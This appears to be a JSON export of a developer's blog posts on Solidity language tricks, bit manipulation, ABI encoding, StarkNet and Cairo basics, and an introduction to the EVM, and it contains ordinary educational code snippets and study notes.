{
  
    
        "post0": {
            "title": "Solidity - Passing functions as parameters",
            "content": "Function Types . For official documentations follow this link. . So, in Solidity, you can pass functions themselves as parameters to other functions. These type of parameters are called function types. . These function types can be used to pass and return functions from function calls. . Example . 1. Format of function types is the following: . function (&lt;parameter types&gt;) {internal | external} [pure | view | payable] [returns(&lt;return types&gt;)] . Note : Function types can only be internal or external. Also, the return types cannot be empty if the function in question does not return anything, in this case, completely omit the returns keyword. . 2. Conversions . function A can be converted to function B if they identical parameter types, identical return types, identical internal/external propery, and state mutability of A is more restrictive than B. . Since view says that no state will be changed whereas pure says no state variable will be changed or read. Therefore, pure is more restrictive than view . Also, rememeber that all non-payable functions are payable (accepting 0 Ether), but no non-payable is payable. Therefore non-payable is more restrictive. . So, . 2.1 pure can be converted to view and non-payable . 2.2 view can be converted to non-payable . 2.3 non-payable can be converted to payable . 3. A short mock implementation of this concept . // SPDX-License-Identifier: MIT pragma solidity ^0.8.11; contract FunctionParameter { uint256 public currentSupply = 100; function increaseSupply(uint256 _newSupply) public returns(uint256) { uint256 _currentSupply = currentSupply; _changeSupply(_currentSupply, _newSupply, _add); return currentSupply; } function decreaseSupply(uint256 _decreaseSupplyBy) public returns(uint256) { uint256 _currentSupply = currentSupply; _changeSupply(_currentSupply, _decreaseSupplyBy, _sub); return currentSupply; } function fundMe() external payable{} //////////////////////// // Internal functions //////////////////////// function _changeSupply(uint256 a, uint256 b, function(uint256, uint256) internal pure returns(uint256) foo) internal returns(uint256) { currentSupply = foo(a, b); return currentSupply; } function _add(uint256 a, uint256 b) internal pure returns (uint256) { return (a + b); } function _sub(uint256 a, uint256 b) internal pure returns(uint256) { return (a &gt; b ? (a - b) : 0 ); } } . Similarly as this was done for internal function calls, you can use this concept for external function calls. . Note: One obvious but important thing to note here is that the internal functions can only be called inside the current contract (including library functions and inherited functions) because they cannot be executed outside of the context of the current contract. .",
            "url": "https://saxenism.com/web3/language-tricks/intermediate/solidity/2022/09/27/Solidity-Functions-As-Params.html",
            "relUrl": "/web3/language-tricks/intermediate/solidity/2022/09/27/Solidity-Functions-As-Params.html",
            "date": " • Sep 27, 2022"
        }
        
    
  
    
        ,"post1": {
            "title": "Solidity - Typecasting Addresses to Uint",
            "content": "Convert address to uint and back . // SPDX-License-Identifier: MIT pragma solidity ^0.8.7; // The theory behind this is that addresses take up 20 bytes in a word which is equivalent to (20*8) 160 bits and hence should be correctly casted to and from uint160. contract AddressToUint { address public targetAddress; uint256 public targetUint; function convertAddressToUint(address _targetAddress) external returns(uint256) { targetAddress = _targetAddress; targetUint = uint256(uint160(_targetAddress)); return targetUint; } function convertUintToAddress(uint256 _targetUint) external returns(address) { targetUint = _targetUint; targetAddress = address(uint160(_targetUint)); return targetAddress; } } // 0xabD0127D996A468A79a0a8e88F4D419E40402e95 // 980877587572537262620952019491558306941665029781 .",
            "url": "https://saxenism.com/web3/language-tricks/beginner/solidity/2022/09/27/Solidity-Address-To-Uint.html",
            "relUrl": "/web3/language-tricks/beginner/solidity/2022/09/27/Solidity-Address-To-Uint.html",
            "date": " • Sep 27, 2022"
        }
        
    
  
    
        ,"post2": {
            "title": "Intro to StarkNet",
            "content": "ASIC to CPU . ASIC (Application Specific Integrated Circuits) are specialized, fast, expensive and very hard to design. . | CPUs are general purpose, slower, cheaper and easier to program for. A single architecture for multiple purposes. . | Choosing between ASIC and CPU is a case between efficiency vs flexibility . | STARK . STARK is a family of cryptographic proof systems that can be used for privacy and scalability. . | STARK proves statments, saying that a computation was executed correctly. . | Examples for provable statements: . 3.1. The 1000th number in the Fibonacci sequence is X. 3.2. I have 100 signed bank txns that are valid . | Starkware/Starknet focuses on scalability instead of privacy and the primary focus is to reduce the verification time as much as possible. . | What is StarkNet . StarkNet is a permissionless decentralized Validity-rollup (ZK-Rollup). It operates as an L2 network over Ethereum, enabling any dApp to achieve unlimited scale for its computation - without compromising Ethereum’s composability and security (thanks to STARK). . StarkNet contracts and the StarkNet OS are written in Cairo - supporting the deployment and scaling of any use case, whatever the business logic. . Wallets on StarkNet . In StarkNet there is only one type of accounts - smart contract accounts (this is called Account Abstraction), in contrast to Ethereum where there are wallets and smart contracts. Therefore, every wallet on StarkNet is a smart contract and there is no distinction between them and other smart contracts. . Therefore, to create a new wallet, you need to deploy a transaction that publishes your smart contract wallet to the network. . Validity Proofs (StarkNet, zkSync) . ZK Proofs == Validity Proofs . A novel piece of cryptography lets you collapse quite a bit of computation into a small easily verifiable proof, called zero knowledge proofs. . So, in a network there are a few big computers, doing the heavy lifting of actually doing all the computations, but all the other people in the network with smaller computers have the means to verify the work done by the big computer miners via Zk. . Zk proofs assure you, that some computation was done correctly, without you having to do all the computations. . Basically you have mathematical guarentee that the big computers/miners are working as expected. . And, the beautiful thing about this is that these proofs can be verified by Ethereum too. . Proofs . Think of proofs as a new cryptographic primitive where a prover can present his proof for having spent certain resources for doing certain amount of computations. . Basic Assumption for proofs, and for validity proofs to be considered legitimate is that: . Time(proof verification) &lt; Time(underlying program execution) . Ethereum can natively understand the zk-proofs generated by the prover. . There is no middle man between Starknet and Ethereum. . The case of Middle Men . How do you get to use BTC on the ETH chain ? . You give your BTC to BitGo and they give you equivalent ERC20 tokens of WBTC (minus some fee). . In this process, there is a huge human component involved. Humans have to do the translation between chains. . Most L1’s and bridges work this way. . Yes, we do have certain incentives for those humans to not cheat. However, with this primitive (proofs) we do not need humans whatsoever. . Awesomeness of ZKP (Recursions) . Size of proofs increase logarithmically with the number of computations. . Recursion: A Thought Experiment . Soon enough, what you’ll be able to do is start a StarkNet instance, do some computations and send the proof to another StarkNet instance which is 1 layer below it, to verify the proof. . That lower instance again does it’s own computations and creates a new proof from the proof it recieved + it’s own computations and then sends this new proof one layer down. . This keeps on happening until eventually the proofs reach the underlying L1 with a single proof of a fuck-ton of computations. . Ethereum verifying the proofs sent over has nothing to do with PoW. The verification is done banking on the EVM’s ability to process and run opcodes. So, if Ethereum uses PoW or PoS or anything else going into the future, as long as EVM can process opcodes, it can verify zk-proofs . Calculations . StarkNet so good at calculations, you could run entire game engines on top of it. Case in point is the recursion that we just discussed. Kinda makes on-chain computation infinitely scalable. . Do not assume privacy from StarkNet. Because the txn block you send would be visible in clear. Only advantage here is that you do not need to repeat all computations to verify all computations. . Stark vs Snark . Stark prover is way more efficient (faster) than Snark. Snark beats Stark in other areas, but proving time is the criterion with which StartNet moves ahead. . Cairo . Cairo is a turing-complete language (a language that has overcome the halting problem) that developer can use to leverage the power of STARKs. . Cairo does not have any circuits associated with it. . The Cairo CPU is quite different than your regular x86 in the sense that your x86 is very good at logical operations but bad at division, the case is inverted in case of Cairo CPU. . Cairo helps you program non-determinism into your program (I do not understand what that means. Yet.) . From the documentation . Cairo is not a high-level programming language but a low-level programming language with powerful syntactical sugar. Cairo is powerful enough to write almost anything that can run on the Cairo VM. . | Recursion instead of loops . | Cairo memory is immutable and once something is written to a slot, it cannot be changed in the future and hence we try and use recursions instead of loops. . Loops are possible, but very complicated to implement in Cairo (this might change in Cairo v1.0) . Assert Statements | In Cairo, assert statements such as . assert [ptr] = 0; . will assert that the value of memory cell at address ptr is indeed 0 or not iff the value of the memory cell at address ptr was already 0. Otherwise, Cairo will set the value of [ptr] to 0 and then assert it to be equal to 0, making the assert to pass. . Also you can’t re-set the value of [ptr] if you’ve already set it before, this behaviour is again a testimony to the fact that the Cairo memory is immutable. . Writing a main() function | Consider the following function . %builtins output from starkware.cairo.common.serialize import serialize_word func main{output_ptr: felt*}() { serialize_word(1234); serialize_word(4321); return (); } . The main() function is the starting point of all Cairo prorams. . The %builtin outputs helps Cairo communicate with the external world, think cout from C++. The communication with the builtin is done by reading/writing values to the memory. The output builtin is quite simple: Declaring it using %builtins turns the signature of main() to main{output_ptr: felt*}(). . {} represents implicit arguments. . The argument (from the main function) points to the beginning of the memory segment to which the program output should be written. The program then returns a pointer to the memory that marks the end of the output. The convention we use in Cairo, is that the end of a memory segment always points to the memory cell after the last written cell. . The function serialize_word takes one implicit argument (and thus returns one implicit argument) and takes one explicit argument (the one that we need to write) . serialize_output(x) writes x to the memory cell pointed by output_ptr (that is, [output_ptr]) and returns output_ptr + 1. Now the implicit argument mechanism kicks in: in the first call to serialize_word() the Cairo compiler passes the value of output_ptr as the implicit argument. In the second call it uses the value returned by the first call. . The import statement is well…. an import statement. You could also have done ... import serialize_word as foo to use the name foo for serialize_word. . Field Elements (felt) | What we mean by a felt in Cairo is an integer in the range -P/2 &lt; x &lt; P/2 where P is a very large (prime) number (currently it is a 252-bit number, which is a number with 76 decimal digits). All calculations (multiplication, addition, subtraction) are done as modulo P. . The important distinction here is in division. Do not think of division in felts as normal integer division. As long as the numerator is perfectly divisible by the denominator, you will get the expected output, but for something like 7/3 instead of 2 (or 2.333…) you will get an arbitrarily large number. . This is because, for division to be successful in Cairo, it must satisfy the equation . (x/y) * y = x . So, (6/2) * 2 is indeed 6, but (7/2)*2 != 7, right? . But you know what is correct value of y in the second case? See this: . (P + 7 / 2) * 2 = P + 7 and (P + 7) modulo P is 7. Therefore, the answer to this division of 7/3 is (P+7)/2 . First lines of Cairo . # fun with cairo func sqr(a) -&gt; (a): return (a = a * a) end func add_num_square(x, y) -&gt; (x): let a = x + y let (z) = sqr(a = a) return (x = z) end func main(): let (x) = add_num_square(x = 1, y = 3) assert x = 16 return () end . Sum of all elements of an array . %builtins output from starkware.cairo.common.serialize import serialize_word from starkware.cairo.common.alloc import alloc func arr_sum(arr: felt*, size) -&gt; felt { if(size == 0) { return 0; } let sum_of_rest = arr_sum(arr = arr + 1, size = size - 1); return arr[0] + sum_of_rest; } func main{output_ptr: felt*}() { const SIZE_ARRAY = 3; // allocate an array let (ptr) = alloc(); assert[ptr] = 33; assert[ptr + 1] = 44; assert[ptr + 2] = 69; let sum_of_array = arr_sum(arr = ptr, size = SIZE_ARRAY); serialize_word(sum_of_array); return(); } . Product of all even entries of the array . %builtins output from starkware.cairo.common.serialize import serialize_word as print from starkware.cairo.common.alloc import alloc func arr_sum(arr: felt*, size) -&gt; felt { if(size == 0) { return 0; } let sum_of_others = arr_sum(arr = arr + 1, size = size - 1); return arr[0] + sum_of_others; } func arr_product(arr: felt*, size) -&gt; felt { if(size == 0) { return 1; } // This is assuming an even length of array let prod_of_others = arr_product(arr = arr + 2, size = size - 2); return arr[0] * prod_of_others; } func main{output_ptr: felt*}() { const ARR_SIZE = 4; // Initializing space for an array let (ptr) = alloc(); // Putting out the initial values in the array assert [ptr] = 40; assert [ptr + 1] = 3; assert [ptr + 2] = 2; assert [ptr + 3] = 1; // let sum_of_array = arr_sum(ptr, ARR_SIZE); // print(sum_of_array); let product_of_even_array = arr_product(arr = ptr, size = ARR_SIZE); print(product_of_even_array); return(); } . The 15-Puzzle . %builtins output . from starkware.cairo.common.serialize import serialize_word as print . struct Location { row: felt, col: felt, } . // Location* // The expression Location* instructs Cairo to interpret loc as the address of a Location instance. // This means that it will expect that the value of the memory at address loc is the row of the location, and // the value at address loc + 1 is the column. loc.row and loc.col is just syntatic sugar . // Tempvar // The scope of a temporary variable is limited. Using it is delicate since a temporary variable maybe revoked due to jumps/function calls etc. . // &lt; operator // In cairo, the less than operation is a complicated operation and so Cairo has a builtin called range-check that allows comparing values . // return() // In Cairo the return statment is not implicit even if the function does not return anything . func verify_adjacent_locations(loc0: Location, loc1: Location) { alloc_locals; local row_diff = loc0.row - loc1.row; local col_diff = loc0.col - loc1.col; . if(row_diff == 0) { assert col_diff * col_diff = 1; return (); } else { assert row_diff * row_diff = 1; assert col_diff = 0; return(); } } . // local variables are much more less restricted than tempvar and can be accessed till the end of a function without exception // alloc_locals allocates memory required for the local variables of the function. Usually, this should be the first statement in a function which uses local variables. . func verify_valid_location(loc: Location*) { // Check that row is in range 0-3 tempavar row = loc.row; assert row * (row - 1) * (row - 2) * (row - 3) = 0; . // Check that column is in range 0-3 tempvar col = loc.col; assert col * (col - 1) * (col - 2) * (col - 3) = 0; return (); } . // A reference is defined using a let statement. // So, let x = yyy . func main{output_ptr: felt*}(){ print(214); return(); } .",
            "url": "https://saxenism.com/web3/cairo/starknet/beginner/zero-knowledge/2022/09/07/Cairo-101.html",
            "relUrl": "/web3/cairo/starknet/beginner/zero-knowledge/2022/09/07/Cairo-101.html",
            "date": " • Sep 7, 2022"
        }
        
    
  
    
        ,"post3": {
            "title": "Solidity - Bit Magic",
            "content": "Bit Magic . Bitwise Operations . Includes all basic bitwise operations such as and, or, xor, not, shiftLeft, shiftRight etc. . uint x; uint y; x &amp; y // and x | y // or x ^ y // xor ~x // not x &lt;&lt; y // shift x by y bits to the left x &gt;&gt; y // shift x by y bits to the right . Get Last N bits . Binary representation of (x-1) can be obtained by simply flipping all the bits to the right of the rightmost 1 in x and also including the rightmost 1. . Example (Confirm using this website if you want) . 7 = 0111 . 6 = 0110 . . 70 = 1000110 . 69 = 1000101 . . 420 = 110100100 . 419 = 110100011 . . So, now if you created a number of N bits with all 1’s, and did an &amp; with the number x in question, you will get the value of the last N bits. . function getLastNBits(uint x, uint n) external pure returns(uint256) { uint mask = (1 &lt;&lt; n) - 1; return x &amp; mask; } . Most significant bit position . Keep on right-shifting the number until it all becomes 0. Count the number of times, you had to do this operations. That’s all. . function mostSignificantBit(uint256 x) public pure returns(uint256) { uint i; while((x &gt;&gt;= 1) &gt; 0) { ++i; } return i; } . Get first N bits . Same concept as the function getLastNBits we discussed above. . The only change here would be in the mask where we shift n number of 1’s to the beginning of the mask and keep the rest as 0’s. . Another tip would be, if length is not available, then use the function mostSignificantBit we discussed before. . function getFirstNBits(uint x, uint n, uint len) public pure returns(uint256) { uint mask = ((1 &lt;&lt; n) - 1) &lt;&lt; (len - n); return x &amp; mask; } . Is Power of 2 . If x is a power of 2, then x will have only 1 set bit, rest all will be 0’s. And then for (x-1) all bits will be set apart from the earlier leading 1. Therefore, if x would be a power of 2, then x&amp;(x-1) will always give 0 as the result. . function isPowerOfTwo(uint x) external pure returns(bool) { return (x == 0 || x &amp; (x-1) == 0); } . Count number of set bits . As explained in the previous algorithm, the relationship between the bits of x and x-1. So as in x-1, the rightmost 1 and bits right to it are flipped, then by performing x&amp;(x-1), and storing it in x, will reduce x to a number containing number of ones(in its binary form) less than the previous state of x, thus increasing the value of count in each iteration. . function countSetBits(uint x) public pure returns(uint) { uint count; while (x != 0) { x = x &amp; (x-1); ++count; } return count; } . Pack a number of bools into a single slot (inside uint256) . As you may know the most expensive operation in Ethereum is storing data (SSTORE). So you should always look for ways to reduce the storage requirements. . Don’t need to explain much. Code is enough. . // SPDX-License-Identifier: MIT pragma solidity ^0.8.7; contract BitManipulations { bool[33] public arr = [true, false, true, false,true, false,true, false,true, false,true, false,true, false,true, false,true, false,true, false,true, false,true, false,true, false,true, false,true, false,true, false, false]; /* 0: true 1: false 2: true 3: false 4: true 5: false 6: true 7: false 8: true 9: false 10: true 11: false 12: true 13: false 14: true . . . */ uint256 public packedBool; function findNthBool(uint256 position) public view returns(bool) { return ((packedBool &gt;&gt; position) &amp; 1 &gt; 0); } function findNthBool2(uint256 position) public view returns(bool) { return ((packedBool &gt;&gt; position) &amp; 1 == 1); } function findNthBool3(uint256 position) public view returns(bool) { return ((packedBool &gt;&gt; position) &amp; 1 != 0); } function packBool() external { uint256 length = arr.length; for(uint i; i &lt; length; ) { setNthBool(i, arr[i]); unchecked { ++i; } } } function setNthBool(uint256 _position, bool _value) internal { if(_value) { packedBool |= (1 &lt;&lt; _position); } else { packedBool &amp;= ~ (1 &lt;&lt; _position); } } } . Extreme Basics - Part 1 . The XOR operator (^) returns 0 for same bits and 1 for different bits. . Truth Table: | x1 | x2 | x1 ^ x2 | | – | – | ——- | | 0 | 0 | 0 | | 0 | 1 | 1 | | 1 | 0 | 1 | | 1 | 1 | 0 | . Detect if two numbers have opposite signs . Since we know that the leftmost bit for a positive integer is 0 and for negative is 1. Therefore, with the xor of the leftmost bits, if we get 1, the signs were different. Also, if we get x^y as 1 for the leftmost bit, it would mean that it’s a negative number and therefore less than 0 . function oppositeSigns(int x, int y) external pure returns (bool) { return (x ^ y &lt; 0); } . Detect if number is even or odd . For a number to be even, the last bit (2^0) should not be set and similarly for odd numbers the last bit is set. So, simply check what’s the last bit of the number. . function isEven(uint x) external pure returns(bool) { return (x &amp; 1 == 0); } . Add 1 to an integer . /* Since we know that negative numbers are stored as 2&#39;s complement in Solidity (and other programming languages), we can use that fact to add 1 to a number (integer) 2&#39;s complement is 1&#39;s complement plus 1 and 1&#39;s complement is simply inverting all bits of the given number Therefore, by reverse engineering, if we did -(~x) we should get x + 1, right? */ function add1ToInt(int x) external pure returns(int) { return -(~x); } . Swap Two Numbers . Alright agreed that this is a bit of an overkill, since Solidity natively provides a cool way to swap values of two numbers, but I’m autistic and let’s just go with the flow :P . Also, the native method to swap two values is ofc more gas efficient. . uint public a = 5; uint public b = 10; function swapTwoNumbers() external { (a, b) = (b, a); } function swapTwoNumbersBitManipulation() external { a = a ^ b; b = b ^ a; a = a ^ b; } . Turn off n’th bit in a number . /* What we want to accomplish here is a bitwise &amp; of the nth bit with 0 so that it becomes 0 and since we do not want to disturb the other bits of the number x, we do a bitwise &amp; of bits of number x with all 1&#39;s. */ function turnOffNthBit(uint x, uint n) external pure returns(uint) { return x &amp; ~(1 &lt;&lt; n); } . Turn on Nth bit in a number . /* Similar to the last function, here since we want to turn ON a bit, we will do a bitwise OR of the nth bit with 1 and for the rest of the bits, we&#39;ll do a bitwise OR with 0, so that they do not get disturbed. */ function turnOnNthBit(uint x, uint n) external pure returns(uint) { return x | (1 &lt;&lt; n); } . Check if the nth bit is set for a number . function checkNthBit(uint x, uint n) external pure returns(bool) { return x &amp; (1 &lt;&lt; n) != 0; } . Toggle nth bit . // We&#39;ll use the fact that: 0 ^ 1 = 1 and 1 ^ 1 = 0 function toggleNthBit(uint x, uint n) external pure returns (uint) { return x ^ (1 &lt;&lt; n); } . Unset the rightmost set bit in a number . // We&#39;ll use the property of n and n-1 here again. function unsetRightmostBit(uint x) external pure returns(uint) { return x &amp; (x-1); } . Find position of rightmost set bit . The idea here would be to first do n &amp; (n - 1) and then do a xor of the resultant with the original number n. After this the only set bit in the number would be the rightmost one. . The latter part of the logic can also be used to determine the position of the only set bit in a number. . function findPositionOfRightmostSetBit(uint n) external pure returns(uint count) { uint num = n ^ (n &amp; (n-1)); while (num != 0) { num &gt;&gt;= 1; ++count; } } function findPositionOfRightmostSetBit_Negation (int n) external pure returns(uint count) { if(n &amp; 1 == 1) { return 1; // Number is odd } int num = n &amp; -n; while(num != 0) { num &gt;&gt;= 1; ++count; } } . Puzzles (Incorporating multiple tricks) . Find number of bits to be flipped to change one number to another . The idea here is to xor the two numbers. This will result in a number whose bit representation will only have set bits where the bits were different in the input numbers. . After that the problem is reduced to simply counting the set bits. . function bitsToFlip(uint x, uint y) external pure returns (uint counter) { uint xoredNumber = x ^ y; while(xoredNumber != 0) { xoredNumber = xoredNumber &amp; (xoredNumber - 1); ++counter; } } . Calculate xor from 1 to N . Given a number N, calculate the value of xoring all number from 1 to N. . // This is the naive method to calculate the xor from 1 to N. function calculateXorToN(uint N) external pure returns (uint result) { for(uint i = 1; i &lt;= N; ) { result ^= i; unchecked { ++i; } } } /* There isn&#39;t some big brain math happening behind (hopefully). This is just observed as a pattern that repeats and hence we use the deductions from observing that pattern while calculating xor from 1 to N. And ofc this function is also much more gas efficient */ function calculateXorToNEfficient(uint N) external pure returns (uint result) { uint moduloN = N%4; if(moduloN == 0) { result = N; } else if(moduloN == 1) { result = 1; } else if(moduloN == 2) { result = N + 1; } else { result = 0; } } . Equal Sum and XOR . Given a positive integer N, find all i such that N+i == N^i, where 0 &lt;= i &lt;= N . function findSumEqualToXor(uint n) external pure returns (uint counter) { for(uint i; i &lt;= n; ) { if((n^i) == (n+i)) { unchecked { ++counter; } } unchecked { ++i; } } } // This function is made possible because of the formula: // (n + i) = (n ^ i) + 2*(n &amp; i) // So, according to the requirement we only need to find all instances where n &amp; i == 0 // To do that we find all unset bits of n and find number of possible combinations (which is 2 raised to the power no of unset bits) function findSumEqualToXorEfficient(uint n) external pure returns (uint counter) { uint unsetBits; while(n != 0) { if(n &amp; 1 == 0) { ++unsetBits; } n &gt;&gt;= 1; } counter = (1 &lt;&lt; unsetBits); } . Takeaway: Remember this formula if you can -&gt; (n+i) = (n^i) + 2*(n&amp;i) . Get the most significant bit position in a given number . function findMSB(uint256 n) external pure returns (uint) { // Since this is uint256, this will have 256 bits. So we will have to take appropriate number of steps. // The number of ORs we do would be based on the bits present in number n. n = n | (n &gt;&gt; 1); // Now starting 2 bits are set in n n = n | (n &gt;&gt; 2); // Now starting 4 bits are set in n n = n | (n &gt;&gt; 4); // Now starting 8 bits are set in n n = n | (n &gt;&gt; 8); // Now starting 16 bits are set in n n = n | (n &gt;&gt; 16); // Now starting 32 bits are set in n n = n | (n &gt;&gt; 32); // Now starting 64 bits are set in n n = n | (n &gt;&gt; 64); // Now starting 128 bits are set in n n = n | (n &gt;&gt; 128); // Now starting 256 bits are set in n n += 1; // Now it&#39;s 1 set bit (higher than the original MSB) and rest are 0s return (n &gt;&gt; 1); } . Advanced problems solved via bit manipulations .",
            "url": "https://saxenism.com/web3/solidity/language-tricks/bit-magic/intermediate/2022/09/06/Bit-Magic-Solidity.html",
            "relUrl": "/web3/solidity/language-tricks/bit-magic/intermediate/2022/09/06/Bit-Magic-Solidity.html",
            "date": " • Sep 6, 2022"
        }
        
    
  
    
        ,"post4": {
            "title": "Modern Solidity",
            "content": "Code snippets depicting modern Solidity . //SPDX-License-Identifier: MIT pragma solidity 0.8.14; contract ModernSolidityFeatures { TestContract tcInstance = new TestContract(); function modernFunctionSelector() public view returns(bytes4) { return tcInstance.square.selector; } function modernIsContract(address addr) public view returns(bool) { return (addr.code.length &gt; 0 ? true : false); } function conventionalIsContract(address addr) public view returns(bool) { uint32 sizeOfAddressCodeSection; assembly { sizeOfAddressCodeSection := extcodesize(addr) } return (sizeOfAddressCodeSection &gt; 0); } function conventionalFunctionSelector(string memory functionSignature) public pure returns(bytes4) { return bytes4(keccak256(bytes(functionSignature))); } } contract TestContract { uint256 public number; function square(uint256 a) public pure returns(uint256) { return a*a; } } .",
            "url": "https://saxenism.com/web3/solidity/modern-solidity/language-tricks/2022/09/02/Modern-Solidity-Features.html",
            "relUrl": "/web3/solidity/modern-solidity/language-tricks/2022/09/02/Modern-Solidity-Features.html",
            "date": " • Sep 2, 2022"
        }
        
    
  
    
        ,"post5": {
            "title": "ABI Encode - Solidity",
            "content": "Different types of abi encode . Let us see today when and why do we use abi.encode vs abi.encodePacked. . What is a hash function? . A hash function has the following characterisitics: . A function that takes in arbitrary size input and outputs a data of fixed size | Properties: Deterministic hash(x) = h, every time without fail | . | quick to compute the hash | irreversible given h, (really)hard to find x such that hash(x) = h | . | small change in input changes the output significantly hard to find x, y such that hash(x) = hash(y) | . | . | . String Encoding . The solidity built-in function abi.encode enables to encode any Solidity types into raw bytes, that can be interpreted directly by the EVM. . Note that multiple arguments can be given to this function. . So, if we do something like: abi.encode(&quot;Solidity&quot;); . We get the result in the following format: . 1st (32 bytes) word = offset → indicates at which bytes index the string starts. Here 0x20 (in hex) = 32 (in decimals). If you count 32 from the beginning (= index 32), you will reach the starting point of where the actual encoded string starts. . | 2nd (32 bytes) word = string length → in the case of the string, this indicates how many characters (including whitespaces) are included in the string. So simply the “string.length “ . | 3rd (32 bytes) word = the actual utf8 encoded string → each individual bytes corresponds to hex notation of a letter / character encoded in utf8. If you search each individual bytes from 536f6c6964697479 inside an utf8 table, you will be able to decode the string. For instance, 53 corresponds to uppercase S , 6f corresponds to lowercase o , 6c corresponds to lowercase l , etc… . | . The actual encoded bytes would look something like this: . { &quot;0&quot;: &quot;bytes: 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000008536f6c6964697479000000000000000000000000000000000000000000000000&quot; } . The contract code was as straightforward as it gets: . // SPDX-License-Identifier: GPL-3.0 pragma solidity 0.8.7; contract StringEncoding { bytes public encodedString = abi.encode(&quot;Solidity&quot;); } . Few other ABI Encodings . address payable -&gt; address | contract -&gt; address | enum -&gt; uint8 | struct -&gt; tuple of elementry types | . Few points on abi.encode, abi.encodePacked, abi.encodeWithSelector, abi.encodeWithSignature . When using abi.encode, all elementary types are padded to 32 bytes and dynamic arrays include their length. Therefore, it is also possible to decode the resulting hash using abi.decode if the data type is known. | This encoding is done using the ABI specs. | . | When using abi.encodePacked only the minimum possible memory is utilised. Therefore, if you were hashing an address with this function, it will only take up 20 bytes and the rest of the word remains unpadded. | For dynamic types, the offset and the length is not stored. abi.encodePacked(&quot;Solidity&quot;); // returns -&gt; 0x536f6c6964697479 . | . | Since abi.encodePacked is non-standard hashing and uses the least amount of memory, it is usually gas-efficient . | If you are making calls to an (external) contract, you’ll more likely be using abi.encode (because it uses the ABI specs) and when you simply want to save some space and not call a contract, you’ll be using abi.encodePacked. . | If you are dealing with more than one dynamic data types, use abi.encode as it prevents collision. . | Whereas, in multiple dynamic data types there is a good chance of collision happening if used with abi.encodePacked . | abi.encodeWithSignature is the same as abi.encode but the function selector is used as the first parameter. Use when the signature is known and don’t want to calculate the selector. . | abi.encodeWithSelector, almost same as abi.encodeWithSignature but first param is selector. | . Code Examples of the above encode options: . // Case 1 (success, ) = address(c).call(abi.encodeWithSignature(&quot;myfunction(uint256,uint256)&quot;, 400,500)); // Case 2 (success, ) = address(c).call(abi.encodeWithSelector(bytes4(keccak256(&quot;myfunction(uint256,uint256)&quot;)), 400,500)); // Case 3 contract_instance.myfunction(400,500); . Case 3 is more expensive but safer than the other cases. This is because, the EVM considers a call to a non-existing contract to always succeed. Therefore, Solidity includes an extra check using the extcodesize opcode when performing external calls. This ensures that the contract that is about to be called either actually exists (contains code) or an exception is raised. . | . Low level calls (which operate on address rather than a contract instance) ignore this check and therefore become gas efficient but less safe. Eg. call, transfer, delegatecall, staticcall, send. . A very important point to note is: If a function exists such that: function foo(uint256 _a, address _b) { // do something } . | . Then, the function selector for this particular function would be: . bytes4(keccak256(bytes(&#39;foo(uint256,address)&#39;))); // This is correct bytes4(keccak256(bytes(&#39;foo(uint256, address)&#39;))); // This would be incorrect, because of the space between the two param types bytes4(keccak256(bytes(&#39;foo(uint,address)&#39;))); // Again incorrect, because we cannot use the alias of uint, we have to use the entire uint256 . A more comprehensive example from solidity-by-example | . // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; contract Receiver { event Received(address caller, uint amount, string message); fallback() external payable { emit Received(msg.sender, msg.value, &quot;Fallback was called&quot;); } function foo(string memory _message, uint _x) public payable returns (uint) { emit Received(msg.sender, msg.value, _message); return _x + 1; } } contract Caller { event Response(bool success, bytes data); // Let&#39;s imagine that contract B does not have the source code for // contract A, but we do know the address of A and the function to call. function testCallFoo(address payable _addr) public payable { // You can send ether and specify a custom gas amount (bool success, bytes memory data) = _addr.call{value: msg.value, gas: 5000}( abi.encodeWithSignature(&quot;foo(string,uint256)&quot;, &quot;call foo&quot;, 123) ); emit Response(success, data); } // Calling a function that does not exist triggers the fallback function. function testCallDoesNotExist(address _addr) public { (bool success, bytes memory data) = _addr.call( abi.encodeWithSignature(&quot;doesNotExist()&quot;) ); emit Response(success, data); } } .",
            "url": "https://saxenism.com/web3/solidity/hashing/keccak256/abi/2022/08/30/ABI-Encode-Vs-EncodePacked.html",
            "relUrl": "/web3/solidity/hashing/keccak256/abi/2022/08/30/ABI-Encode-Vs-EncodePacked.html",
            "date": " • Aug 30, 2022"
        }
        
    
  
    
        ,"post6": {
            "title": "An EVM Deep Dive",
            "content": "EVM-Varta (Let’s talk about the EVM) . Jet: . Yul is part of a greater family of EVM assembly languages . its basically EVM assembly wrapped into a language with some Ssyntactic sugar . What’s great about that is that the only thing you need to write Yul is an understanding of the EVM. Looking at Yul contracts won’t really get you to that point . So, let’s get a bit of a deeper understanding of the EVM . Start a Discussion . Click Here . Index . What is an EVM | The EVM Instruction Set | Ethereum State | Compiling Solidity to EVM Bytecode | Turing Completeness and Gas | Gas | Gas Accounting During Execution | Gas Accounting Considerations | Gas Cost vs Gas Price | Negative Gas Costs (Refunds) | Block Gas Limit | Decisions regarding block gas Limit | Femboy Capital | WIP | . What is an EVM . Consider Ethereum to be a global computer (with each node having its own permanent data store) and EVM is the processor. It basically handles smart contract deployment and execution. It is just a computation engine, and as such provides an abstraction of just computation and storage, similar to Java Virtual Machine(JVM). . The EVM executes its own bytecode intstruction set which higher level smart contract languages such as LLL, Serpent, Mutan or Solidity are compiled into. The EVM does not require to have any scheduling capability because Ethereum clients run through verified block transactions to determine which smart contract needs executing and in which order. This mechanism makes EVM a single-threaded mechanism. . A Turing machine is a finite (there are a limited number of states, such as a coin toss will have only two states: HEADS or TAILS) state machine that has an unlimited supply of paper tape that it can write on and read back. . | The EVM is a quasi-Turing complete state machine. . | Quasi because all execution processes are limited to a finite number of computational steps by the amount of gas available for any given smart contract execution. | . This property: the requirement of a particular amount of gas to execute transactions on the EVM (absence of which leads to halting of execution) helps us do away with the Halting Problem | Note What is the halting problem? . Halting means that the program on certain input will accept it and halt or reject it and halt, but it would never go into an infinite loop. So essentially halting == terminating. . The EVM has a stack-based architecture, storing all in-memory values on a stack. It works with a word size of 256 bits . | EVM has a few addressable data components such as: . An immutable program code ROM (opcodes) | A volatile memory (memory variables probably includes calldata) | A permanent storage (keyword: storage) | . | The EVM Instruction Set (Bytecode operations) . In addition to the typical bytecode operations (arithmetical, logical, memory access, flow control, logging etc), the EVM also has access to account information (address and balance) &amp; block information (current gas price, block number etc) . Arithmetic Operations | ADD //Add the top two stack items MUL //Multiply the top two stack items SUB //Subtract the top two stack items DIV //Integer division SDIV //Signed integer division MOD //Modulo (remainder) operation 